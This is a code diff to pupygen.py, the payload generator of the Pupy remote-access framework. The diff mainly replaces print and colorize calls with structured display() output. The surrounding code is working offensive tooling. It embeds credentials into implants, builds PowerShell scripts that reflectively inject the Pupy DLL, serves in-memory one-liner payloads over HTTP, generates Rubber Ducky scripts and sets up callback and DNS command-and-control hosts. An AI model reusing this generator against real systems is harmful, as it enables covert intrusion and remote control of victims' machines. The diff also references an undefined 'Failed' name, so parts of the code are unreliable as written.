@@ -29,7 +29,6 @@ import pylzma
 import struct
 
 from pupylib.utils.network import get_listener_ip, get_listener_port
-from pupylib.utils.term import colorize
 from pupylib.payloads import dependencies
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
@@ -37,6 +36,7 @@ from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.PupyConfig import PupyConfig
 from pupylib.PupyCompile import pupycompile
 from pupylib.PupyLogger import getLogger
+from pupylib.PupyOutput import Success, Warn, Error, List, Table, MultiPart, Color
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
@@ -47,8 +47,9 @@ logger = getLogger('gen')
 
 HARDCODED_CONF_SIZE=65536
 
-def get_edit_binary(path, conf, compressed_config=True, debug=False):
+def get_edit_binary(display, path, conf, compressed_config=True, debug=False):
     logger.debug("generating binary %s with conf: %s"%(path, conf))
+
     binary=b""
     with open(path, 'rb') as f:
         binary=f.read()
@@ -127,12 +128,15 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
         else:
             not_available.append(cred)
 
-    print colorize("[+] ", "green") + 'Required credentials (found):\n{}'.format(
-        colorize("[+] ", "green") + ', '.join(available))
+
+    display(
+        List(available, bullet=Color('+', 'green'),
+        caption=Success('Required credentials (found))')))
 
     if not_available:
-        print colorize("[-] ", "red") + 'Required credentials (not found):\n{}'.format(
-            colorize("[-] ", "red") + ', '.join(not_available))
+        display(
+            List(not_available, bullet=Color('-', 'red'),
+            caption=Error('Required credentials (not found))')))
 
     embedded_credentials = '\n'.join([
         '{}={}'.format(credential, repr(credentials[credential])) \
@@ -140,11 +144,11 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     ])+'\n'
 
     if verbose:
-        for k, v in conf.iteritems():
-            if k in ('offline_script'):
-                continue
+        config_table = [{
+            'KEY': k, 'VALUE': 'PRESENT' if k in ('offline_script') and v else v
+        } for k,v in conf]
 
-            print colorize("[C] {}: {}".format(k, v), "yellow")
+        display(Table(config_table, ['KEY', 'VALUE'], 'Configuration'))
 
     config = '\n'.join([
         'pupyimporter.pupy_add_package({})'.format(
@@ -205,7 +209,6 @@ def updateTar(arcpath, arcname, file_path):
 
             with tarfile.open(arcpath+"2", 'w:gz') as tfw:
                 for n in names:
-                    #print "adding %s"%n
                     if n!=arcname:
                         tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
                     else:
@@ -214,7 +217,7 @@ def updateTar(arcpath, arcname, file_path):
     finally:
         shutil.rmtree(tempdir)
 
-def get_edit_apk(path, conf, compressed_config=None, debug=False):
+def get_edit_apk(display, path, conf, compressed_config=None, debug=False):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
@@ -231,10 +234,12 @@ def get_edit_apk(path, conf, compressed_config=None, debug=False):
         import py_compile
         py_compile.compile(os.path.join(tempdir, "pp.py"), os.path.join(tempdir, "pp.pyo"))
 
-        print "[+] packaging the apk ... (can take 10-20 seconds)"
+        display(Success('Packaging the apk ... (can take 10-20 seconds)'))
+
         #updating the tar with the new config
         updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir, "pp.pyo"))
         #repacking the tar in the apk
+
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(tempapk, "assets/private.mp3", t.read())
 
@@ -249,10 +254,10 @@ def get_edit_apk(path, conf, compressed_config=None, debug=False):
                 return apk.read()
 
         except subprocess.CalledProcessError, e:
-            print colorize('[-] ', 'red'), e.output
+            display(Failed(e.output))
         except OSError, e:
             if e.errno == os.errno.ENOENT:
-                raise ValueError("Please install jarsigner first.")
+                display(Failed('Please install jarsigner first.'))
             raise e
 
     finally:
@@ -260,7 +265,7 @@ def get_edit_apk(path, conf, compressed_config=None, debug=False):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x86=False):
+def generate_ps1(display, conf, outpath=False, output_dir=False, both=False, x64=False, x86=False):
 
     SPLIT_SIZE = 100000
     x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
@@ -309,7 +314,7 @@ def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x
         for i, aPart in enumerate(binaryX64parts):
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
             x64ConcatCode += "$PEBytes{0}+".format(i)
-        print(colorize("[+] ","green") + "X64 dll loaded and {0} variables used".format(i + 1))
+        display(Success('X64 dll loaded and {0} variables used'.format(i + 1)))
 
     if both or x86:
         # generate x86 ps1
@@ -318,7 +323,7 @@ def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x
         for i, aPart in enumerate(binaryX86parts):
             x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
             x86ConcatCode += "$PEBytes{0}+".format(i)
-        print(colorize("[+] ","green") + "X86 dll loaded and {0} variables used".format(i + 1))
+        display(Success('X86 dll loaded and {0} variables used'.format(i + 1)))
 
     script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
 
@@ -338,7 +343,7 @@ def generate_ps1(conf, outpath=False, output_dir=False, both=False, x64=False, x
 
     return outpath
 
-def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
+def generate_binary_from_template(display, config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
     TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
     ARCH_CONVERT = {
         'amd64': 'x64', 'x86_64': 'x64',
@@ -413,13 +418,14 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     if not os.path.isfile(template):
         raise ValueError('Template not found ({})'.format(template))
 
-    for k, v in config.iteritems():
-        if k in ('offline_script'):
-            continue
 
-        print colorize("[C] {}: {}".format(k, v), "yellow")
+    config_table = [{
+        'KEY': k, 'VALUE': str(v) if not k in ('offline_script') else 'PRESENT'
+    } for k,v in config.iteritems()]
 
-    return generator(template, config, compressed, debug), filename, makex
+    display(Table(config_table, ['KEY', 'VALUE'], 'Configuration'))
+
+    return generator(display, template, config, compressed, debug), filename, makex
 
 def load_scriptlets():
     scl={}
@@ -435,7 +441,7 @@ def load_scriptlets():
                         scl[module_name]=module2.ScriptletGenerator
     return scl
 
-def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
+def parse_scriptlets(display, args_scriptlet, os=None, arch=None, debug=False):
     scriptlets_dic = load_scriptlets()
     sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
     for sc in args_scriptlet:
@@ -455,14 +461,14 @@ def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
                     x for x in scriptlets_dic.iterkeys()
                 ]))
 
-        print colorize("[+] ","green")+"loading scriptlet %s with args %s"%(repr(name), sc_args)
+        display(Success('loading scriptlet {} with args {}'.format(repr(name), sc_args)))
+
         try:
             sp.add_scriptlet(scriptlets_dic[name](**sc_args))
         except ScriptletArgumentError as e:
-            print(colorize("[-] ","red")+"Scriptlet %s argument error : %s"%(repr(name),str(e)))
-            print("")
-            print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
-            scriptlets_dic[name].print_help()
+            display(MultiPart(
+                Error('Scriptlet {} argument error: {}'.format(repr(name), str(e))),
+                scriptlets_dic[name].format_help()))
             raise ValueError('{}'.format(e))
 
     script_code=sp.pack()
@@ -470,32 +476,6 @@ def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
 
 class InvalidOptions(Exception):
     pass
-
-class ListOptions(argparse.Action):
-    def __call__(self, parser, namespace, values, option_string=None):
-        print colorize("## available formats :", "green")+" usage: -f <format>"
-        print "\t- client           : generate client binary"
-        print "\t- py               : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
-        print "\t- pyinst           : generate a python file compatible with pyinstaller"
-        print "\t- py_oneliner      : same as \"py\" format but served over http to load it from memory with a single command line."
-        print "\t- ps1              : generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process."
-        print "\t- ps1_oneliner     : load pupy remotely from memory with a single command line using powershell."
-        print "\t- rubber_ducky     : generate a Rubber Ducky script and inject.bin file (Windows Only)."
-        print ""
-        print colorize("## available transports :","green")+" usage: -t <transport>"
-        for name, tc in transports.iteritems():
-            try:
-                print "\t- {:<14} : {}".format(name, tc.info)
-            except Exception as e:
-                logger.error(e)
-
-        print colorize("## available scriptlets :", "green")+" usage: -s <scriptlet>,<arg1>=<value>,<args2=value>..."
-        scriptlets_dic=load_scriptlets()
-        for name, sc in scriptlets_dic.iteritems():
-            print "\t- {:<15} : ".format(name)
-            print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
-
-        raise InvalidOptions
 
 PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
@@ -529,7 +509,7 @@ def get_parser(base_parser, config):
 
     parser.add_argument('-D', '--output-dir', default=default_payload_output, help="output folder (default: %(default)s)")
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
-    parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
+    parser.add_argument('-l', '--list', action='store_true', help="list available formats, transports, scriptlets and options")
     parser.add_argument('-E', '--prefer-external', default=config.getboolean('gen', 'external'),
                             action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
@@ -551,21 +531,43 @@ def get_parser(base_parser, config):
         nargs=argparse.REMAINDER, help="launcher options")
     return parser
 
-def pupygen(args, config):
-    ok = colorize("[+] ","green")
+def pupygen(args, config, display):
+    if args.list:
+        scriptlets_dic = load_scriptlets()
+        display(MultiPart([
+            Table([{
+                'FORMAT': f, 'DESCRIPTION': d
+            } for f,d in {
+                'client': 'generate client binary (linux/windows/apk/..)',
+                'py': 'fully packaged python file',
+                'py_oneliner': 'same as \'py\' format but served over http',
+                'ps1': 'generate ps1 file which embeds pupy dll (x86-x64) and inject it to current process',
+                'ps1_oneliner': 'load pupy remotely from memory with a single command line using powershell'
+            }.iteritems()], ['FORMAT', 'DESCRIPTION'], 'Available formats (usage: -f <format>)'),
+
+            Table([{
+                'TRANSPORT': name, 'DESCRIPTION': t.info
+            } for name, t in transports.iteritems()],
+            ['TRANSPORT', 'DESCRIPTION'], 'Available transports (usage: -t <transport>)'),
+
+            Table([{
+                'SCRIPTLET': name, 'DESCRIPTION': sc.__doc__
+            } for name, sc in scriptlets_dic.iteritems()],
+            ['SCRIPTLET', 'DESCRIPTION'], 'Available scriptlets (usage: -s <scriptlet>[,arg1=value1,arg2=value2]')
+        ]))
+        return
 
     if args.workdir:
         os.chdir(args.workdir)
 
     script_code=""
     if args.scriptlet:
-        script_code=parse_scriptlets(
+        script_code = parse_scriptlets(
+            display,
             args.scriptlet,
             os=args.os,
             arch=args.arch,
-            debug=args.debug_scriptlets
-        )
-
+            debug=args.debug_scriptlets)
 
     launcher = launchers[args.launcher]()
     while True:
@@ -579,9 +581,11 @@ def pupygen(args, config):
                                          "You must precise an ip or a fqdn manually")
                 myport = get_listener_port(config, external=args.prefer_external)
 
-                print(colorize("[!] required argument missing, automatically adding parameter "
-                                   "--host {}:{} from local or external ip address".format(myip, myport),"grey"))
-                if "-t" in args.launcher_args or "--transport" in args.launcher_args:
+                display(Warn(
+                    'Required argument missing, automatically adding parameter'
+                    '--host {}:{} from local or external ip address'.format(myip, myport)))
+
+                if '-t' in args.launcher_args or '--transport' in args.launcher_args:
                     args.launcher_args += ['--host', '{}:{}'.format(myip, myport)]
                 else:
                     args.launcher_args += [
@@ -590,18 +594,19 @@ def pupygen(args, config):
             elif str(e).strip().endswith('--domain is required') and '--domain' not in args.launcher_args:
                 domain = config.get('pupyd', 'dnscnc').split(':')[0]
                 if not domain or '.' not in domain:
-                    print(colorize('[!] DNSCNC disabled!', 'red'))
+                    display(Error('DNSCNC disabled!'))
                     return
 
-                print(colorize("[!] required argument missing, automatically adding parameter "
-                                   "--domain {} from configuration file".format(domain),"grey"))
+                display(Warn(
+                    'Required argument missing, automatically adding parameter'
+                    '--domain {} from configuration file'.format(domain)))
 
                 args.launcher_args = [
                     '--domain', domain
                 ]
 
             else:
-                launcher.arg_parser.print_usage()
+                display(launcher.arg_parser.format_help())
                 return
         else:
             break
@@ -623,13 +628,14 @@ def pupygen(args, config):
     outpath=args.output
 
     if not os.path.isdir(args.output_dir):
-        print ok+"Creating the local folder '{0}' for generating payloads".format(args.output_dir)
+        display(Success('Creating the local folder {} for generating payloads'.format(repr(args.output_dir))))
         os.makedirs(args.output_dir)
 
-    if args.format=="client":
-        print ok+"Generate client: {}/{}".format(args.os, args.arch)
+    if args.format == 'client':
+        display(Success('Generate client: {}/{}'.format(args.os, args.arch)))
 
         data, filename, makex = generate_binary_from_template(
+            display,
             conf, args.os,
             arch=args.arch, shared=args.shared, debug=args.debug,
             compressed=not (args.uncompressed or args.packer)
@@ -659,7 +665,7 @@ def pupygen(args, config):
 
         if args.packer:
             packingFinalCmd = args.packer.replace('%s', outfile.name)
-            print ok+"Packing payload with this command: {0}".format(packingFinalCmd)
+            display('Packing payload with this command: {}'.format(packingFinalCmd))
             subprocess.check_call(
                 packingFinalCmd,
                 shell=True
@@ -705,7 +711,7 @@ def pupygen(args, config):
         serve_payload(packed_payload, link_ip=link_ip, port=args.oneliner_listen_port)
 
     elif args.format=="ps1":
-        outpath = generate_ps1(conf, outpath=outpath, output_dir=args.output_dir, both=True)
+        outpath = generate_ps1(display, conf, outpath=outpath, output_dir=args.output_dir, both=True)
 
     elif args.format=="ps1_oneliner":
         if conf['launcher'] in ["connect", "auto_proxy"]:
@@ -726,36 +732,45 @@ def pupygen(args, config):
             from pupylib.payloads.ps1_oneliner import send_ps1_payload
             outpath, target_ip, bind_port = "", None, None
             bind_port=conf["launcher_args"][conf["launcher_args"].index("--port")+1]
-            if "--oneliner-host" in conf["launcher_args"]:
-                target_ip=conf["launcher_args"][conf["launcher_args"].index("--oneliner-host")+1]
+            if '--oneliner-host' in conf['launcher_args']:
+                target_ip=conf['launcher_args'][conf['launcher_args'].index('--oneliner-host')+1]
                 send_ps1_payload(conf, bind_port=bind_port, target_ip=target_ip, nothidden=args.oneliner_nothidden)
-                print(ok+"You have to connect manually to the target {0} with 'connect --host {0}:{1}'".format(target_ip, bind_port))
+                display(Success(
+                    'You have to connect manually to the target {} '
+                    'with "connect --host {0}:{1}"'.format(target_ip, bind_port)))
             else:
-                raise ValueError("You have to give me the --oneliner-host argument")
+                raise ValueError('You have to give me the --oneliner-host argument')
         else:
-            raise ValueError("ps1_oneliner with {0} mode is not implemented yet".format(conf['launcher']))
+            raise ValueError('ps1_oneliner with {0} mode is not implemented yet'.format(conf['launcher']))
 
-    elif args.format=="rubber_ducky":
+    elif args.format=='rubber_ducky':
         rubber_ducky(conf).generateAllForOStarget()
 
     else:
         raise ValueError("Type %s is invalid."%(args.format))
 
-    print(ok+"OUTPUT_PATH = %s"%os.path.abspath(outpath))
-    print(ok+"SCRIPTLETS = %s"%args.scriptlet)
-    print(ok+"DEBUG = %s"%args.debug)
+    display('OUTPUT_PATH: {}'.format(os.path.abspath(outpath)))
+    display('SCRIPTLETS:  {}'.format(args.scriptlet))
+    display('DEBUG:       {}'.format(args.debug))
+
     return os.path.abspath(outpath)
 
 if __name__ == '__main__':
+    from pupylib.utils.term import hint_to_text
+
+    def display(data):
+        print hint_to_text(data)
+
     Credentials.DEFAULT_ROLE = 'CLIENT'
     config = PupyConfig()
+
     parser = get_parser(argparse.ArgumentParser, config)
     try:
-        pupygen(parser.parse_args(), config)
+        pupygen(parser.parse_args(), config, display)
     except InvalidOptions:
         sys.exit(0)
-    except EncryptionError, e:
-        logger.error(e)
+    except (ValueError, EncryptionError), e:
+        display(Error(e))
     except Exception, e:
         logger.exception(e)
         sys.exit(str(e))
